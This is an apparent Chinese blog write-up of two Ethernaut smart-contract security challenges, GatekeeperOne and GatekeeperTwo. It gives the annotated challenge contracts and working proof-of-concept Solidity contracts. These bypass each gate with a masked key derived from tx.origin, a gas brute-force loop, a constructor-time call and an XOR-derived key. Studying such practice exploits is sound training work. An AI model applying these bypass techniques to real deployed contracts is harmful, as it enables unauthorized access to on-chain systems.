---
title: 'ethernaut.openzeppelin合约安全闯关-11'
date: 2022-12-12 20:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'
---

<!-- more -->

::: tip

目前来看最全面的智能合约安全靶场:+1:

https://ethernaut.openzeppelin.com/ 

浏览器控制台 help()指令

![help](./assets/1670479273112.png)

:::

#### 第十三 / 十四关GatekeeperOne / GatekeeperTwo思路与POC

#### 目标: 绕过所有的判断

##### 先看第一个合约代码

##### 不得不说bypass这个合约的难度是不小的:exclamation:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;
  //poc思路:第一个判断很简单只需要一个中间合约即可绕过
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
/*
poc思路:第二个判断的话需要gas费用精确为8191的倍数,这点确实很难做到.如果是在本地链的情况下(比如hardhat\REMIX VM)可以call调用此合约enter函数然后debug慢慢调整gas费用.但是如果是在gas费用时刻变化的测试链或主链上根本不可能,使用暴力破解或许可以成功bypass(不一定成功)
*/
  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }
/*
 poc思路:第三个判断就涉及到精确的操作_gateKey变量的内存数据分布了
 第一个限制要求的是 uint32 == uint16 -> 0x B5 B6 B7 B8 == 0x 00 00 B7 B8 (每个B''代表一个字节)
 第二个限制要求的是 uint32 == uint64 -> 0x B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8
 第三个限制要求的是 uint32 == uint16 -> 0x B5 B6 B7 B8 == 0x 00 00 (最后两个字节bytes of tx.origin)
 
 需要构造_gateKey同时满足以上三个条件的内存数据分布: 
 关键在于 第五第六个字节必须为空(pass 1) 最后两个字节的数据必须是tx.origin的地址(pass 3) 
 满足pass掉第一个和第三个限制的内存分布即可pass第二个限制
 
 最终构造: 0x ANY_DATA ANY_DATA ANY_DATA ANY_DATA 00 00 ADDRESS ADDRESS 
 将第五第六个字节置空只需要与运算(运算mask中有空即为空) -> 0xFFFFFFFFFFFFFFFF & (mask)0xFFFFFFFF0000FFFF

*/
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

##### 最终poc脚本:yen:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract byPassGateKeeperOne {
    GatekeeperOne public gatekeeper =
        GatekeeperOne(0x0f72B7881D39527b778dD265AFD190b3e5eF8187);

    function bypass() public {
        //bypass gate3 !solidity0.8以上必须使用uint160(address)
         uint64 gateKey = uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF;
         bytes8 _gateKey = bytes8(gateKey);
         
        //bypass gate2 暴力破解gas限制 
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(
                abi.encodeWithSelector(
                    bytes4(keccak256(bytes("enter(bytes8)"))),
                    abi.encode(_gateKey)
                )
            );
            if(success){
                break;
            }
        }
    }
}

```

#### 来看第二个合约代码:

##### bypass这个合约其实比上一个简单,毕竟没有gas取模判断这种难以达到的条件:ok_hand:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;
//一样中间合约bypass
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    //内联汇编 操作码解释 -> extcodesize(x)表示获取X的大小 caller()获取sender地址
    //所以这里的操作实际是获得传入地址在EVM所占空间的大小(账户地址为0,合约地址为合约字节码大小)
    //poc思路:此处是想限制只有账户地址能访问,其实呢合约在构造的时候所占的EVM空间也是0.恶意代码只要在构造器中调用就能成功bypass
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
//poc思路:关于异或操作我们知道 A Xor B = C , A Xor C = B,所以这里其实就是A Xor C = B
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); //type(uint64).max 表示uint64类型可容纳的最大值
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

##### 最终poc脚本:yen:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract byPassGateKeeperTwo {
    constructor() public {
        GatekeeperTwo keeper = GatekeeperTwo(
            0xE8e8Af3B967a5C1A7e63947460ed8e8765D6d556
        );
       //构建gatekey只需要A和C再转换bytes8即可
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        keeper.enter(gateKey);
    }
}

```

